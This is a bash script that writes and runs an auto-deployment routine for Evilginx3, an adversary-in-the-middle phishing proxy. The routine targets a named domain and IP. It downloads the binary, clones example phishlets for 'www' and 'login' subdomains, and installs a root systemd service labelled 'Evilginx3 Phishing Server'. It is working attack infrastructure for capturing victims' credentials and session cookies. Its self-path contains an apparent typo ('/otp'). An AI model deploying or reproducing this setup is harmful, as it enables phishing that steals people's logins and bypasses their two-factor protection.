#!/bin/bash
# === ENTERPRISE-GRADE EVILGINX3 AUTO-DEPLOYMENT ===
# Domain: hrahra.org | IP: 134.199.198.228 | Version: Hardened + Verified
set -euo pipefail

SELF_PATH="/otp/evilginx3/core/autodeploy.sh"
cat > "$SELF_PATH" <<'EOF_SCRIPT'
#!/bin/bash
set -euo pipefail

### === CONFIGURATION ===
DOMAIN="hrahra.org"
EXTERNAL_IP="134.199.198.228"
SUBDOMAINS=("www" "login")
EVILGINX_DIR="/opt/evilginx3"
PHISHLETS_DIR="$EVILGINX_DIR/phishlets"
BIN_URL="https://github.com/kgretzky/evilginx2/releases/download/v3.3.0/evilginx-v3.3.0-linux-64bit.zip"
SERVICE_FILE="/etc/systemd/system/evilginx.service"
BIN_PATH="$EVILGINX_DIR/evilginx"

### === UTILS ===
log() { echo -e "\033[1;32m[+] $*\033[0m"; }
fatal() { echo -e "\033[1;31m[✘] $*\033[0m" >&2; exit 1; }

### === CLEANUP & PREP ===
log "Cleaning previous install"
systemctl stop evilginx 2>/dev/null || true
rm -rf "$EVILGINX_DIR" /tmp/evilginx_install.* "$SERVICE_FILE"
mkdir -p "$EVILGINX_DIR" "$PHISHLETS_DIR"

### === DEPENDENCY CHECK ===
log "Ensuring dependencies"
apt update -qq
apt install -y unzip wget curl jq || fatal "Dependency installation failed"

### === DOWNLOAD + INSTALL ===
log "Fetching Evilginx3 binary"
ZIPFILE=$(mktemp /tmp/evilginx_install.XXXXXX.zip)
wget -q --show-progress "$BIN_URL" -O "$ZIPFILE" || fatal "Download failed"
unzip -qo "$ZIPFILE" -d "$EVILGINX_DIR" || fatal "Unzip failed"
chmod +x "$BIN_PATH"

### === PHISHLET PLACEHOLDER ===
log "Installing example phishlet"
cp "$EVILGINX_DIR/phishlets/example.yaml" "$PHISHLETS_DIR/www.yaml"
cp "$EVILGINX_DIR/phishlets/example.yaml" "$PHISHLETS_DIR/login.yaml"
sed -i "s/example.com/www.$DOMAIN/g" "$PHISHLETS_DIR/www.yaml"
sed -i "s/example.com/login.$DOMAIN/g" "$PHISHLETS_DIR/login.yaml"

### === SYSTEMD SETUP ===
log "Configuring systemd service"
cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=Evilginx3 Phishing Server
After=network.target

[Service]
Type=simple
ExecStart=$BIN_PATH
Restart=always
User=root
WorkingDirectory=$EVILGINX_DIR

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now evilginx || fatal "Failed to start service"

### === AUTO-CONFIGURE DOMAIN & IP ===
log "Auto-configuring Evilginx domain and IP"
sleep 3
echo -e "config domain $DOMAIN\nconfig ipv4 external $EXTERNAL_IP\nexit" | "$BIN_PATH" >/dev/null 2>&1 || fatal "Evilginx config commands failed"

### === OUTPUT ===
log "Deployment Complete"
echo -e "\033[1;34m
 ┌───────────────────────────────┐
 │ Domain     : $DOMAIN
 │ IP         : $EXTERNAL_IP
 │ Subdomains : ${SUBDOMAINS[*]}
 │ Service    : systemctl start|stop|restart evilginx
 │ Logs       : journalctl -u evilginx -f
 │ Phishlets  : ls $PHISHLETS_DIR
 └───────────────────────────────┘
\033[0m"
EOF_SCRIPT

chmod +x "$SELF_PATH"
sudo "$SELF_PATH"
